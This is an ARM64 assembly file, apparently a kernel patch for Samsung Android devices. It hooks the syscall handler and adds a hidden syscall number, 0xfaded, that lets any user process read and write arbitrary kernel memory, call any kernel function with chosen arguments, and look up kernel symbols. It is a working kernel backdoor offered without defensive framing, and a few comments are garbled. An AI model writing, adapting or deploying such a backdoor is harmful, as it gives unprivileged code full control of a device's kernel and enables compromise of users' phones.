.text

//an assembly patch to make samsung more holy

/**

This should be written to an arbitrary place in memory and then it should be linked

*/

/*
Holy syscall calling convention: 
x8 - contains the desired operation
x0 - x7, contains the desired parameters
*/

.equ PENJAMIN, 0xf0 //read
.equ FULCRUM, 0xf1 //write
.equ PLUG, 0xf2 //execute
.equ IGOT5THINGSTOSAY, 0xf3 //symbol


.equ X0_OFF, 0x0
.equ X1_OFF, 0x8
.equ X2_OFF, 0x10
.equ X3_OFF, 0x18
.equ X4_OFF, 0x20
.equ X5_OFF, 0x28
.equ X6_OFF, 0x30
.equ X7_OFF, 0x38
.equ X8_OFF, 0x40

/*
Faded syscall format:

x8 (Syscall number) = 0xfaded

x0 - command code 
    0xf0 = PENJAMINCITY (arb read)
    0xf1 = FULCRUM (arb write)
    0xf2 = PLUG (arb execute)
    0xf3 = IGOT5THINGSTOSAY (symbolification)

    x1 - x7 - arguments

*/

/* Our application's entry point. */
.global _start
_start: 
    
    stp x24, x25, [sp, #-0x10]!
    stp x26, x27, [sp, #-0x10]!
    

    add x24, sp, #0x20 //pt_regs is sp+0x20 at this point as upon entry sp = pt_regs and we pushed 32 bytes onto the stack
    ldr x26, [x24, #X8_OFF] //load user x8
    mov x25, #0xaded
    movk x25, #0xf, LSL 16
    cmp x26, x25 //compare user x8 with the syscall number
    b.ne normal //if its not equal then just leave


    ldr x25, [x24, #X0_OFF]
    cmp x25, #PENJAMIN
    b.eq penjamin
    cmp x25, #FULCRUM
    b.eq fulcrum
    cmp x25, #PLUG
    b.eq plug
    cmp x25, #IGOT5THINGSTOSAY
    b.eq igot5thingstosay

    
normal:
    ldp x26, x27, [sp], #0x10
    ldp x24, x25, [sp], #0x10
    mov x0, sp
    bl el0_svc_handler
    b ret_to_user


penjamin:
//read from kernelspace. The parameters are equivalent of memcpy: x0 = dest, x1=src, x2=size. src should be a kernelspace pointer, dest should be a user space ptr

    ldr x0, [x24, #X1_OFF]
    ldr x1, [x24, #X2_OFF]
    ldr x2, [x24, #X3_OFF]
    
    bl copy_to_user_fromio 


    b out
fulcrum:
//write to kernelspace. equivalent of memcpy, x0 = dest, x0 = src, x2 = size. dest should be a kernelspace pointer, src should be a 

    ldr x0, [x24, #X1_OFF]
    ldr x1, [x24, #X2_OFF]
    ldr x2, [x24, #X3_OFF]
    
    bl copy_from_user_toio 

    b out

plug:
//execute. x1 is the function address, x2-x7 are the parameters
    ldr x8, [x24, #X1_OFF] //load x1 which is a function pointer
    ldr x0, [x24, #X2_OFF] //x2
    ldr x1, [x24, #X3_OFF] //x3
    ldr x2, [x24, #X4_OFF] //x4
    ldr x3, [x24, #X5_OFF] //x5
    ldr x4, [x24, #X6_OFF] //x6
    ldr x5, [x24, #X7_OFF] //x7
    blr x8

    str x0, [x24, #X0_OFF]

    b out
igot5thingstosay:
//symbol: x1: a *userspace* buffer which represents the name of the symbol
//string length+null terminator: x2
//we need to write a full kmalloc + copy_from_user because otherwise we can't do anything

    ldr x0, [x24, #X2_OFF]
    mov x1, #0x000c0
    movk x1, #0x6, LSL #16 //GFP_KERNEL
    bl __kmalloc
    str x0, [sp, #-0x10]! //store buffer address so we can free it later
    ldr x1, [x24, #X1_OFF] //x1 is the userspace buffer is still pointing to a pt_regs
    ldr x2, [x24, #X2_OFF] //x2 is the size of the string
    bl copy_from_user_toio 
    ldr x0, [sp] 
    bl kallsyms_lookup_name 

    
    str x0, [x24, #X0_OFF] //store it back in pt_regs.x0 
    ldr x0, [sp], #0x10 //load the buffer and restore the stack
    bl kfree //free the buffer
    b out


//at this point we don't really care what the values of the registers are as they will be popped before eret
//the only register we need to maintain is x28 as that contains the thread_info pointer for some reason
//proof: https://elixir.bootlin.com/linux/v4.19.113/source/arch/arm64/kernel/entry.S#L409
out:
    ldp x26, x27, [sp], #0x10
    ldp x24, x25, [sp], #0x10
    b ret_to_user
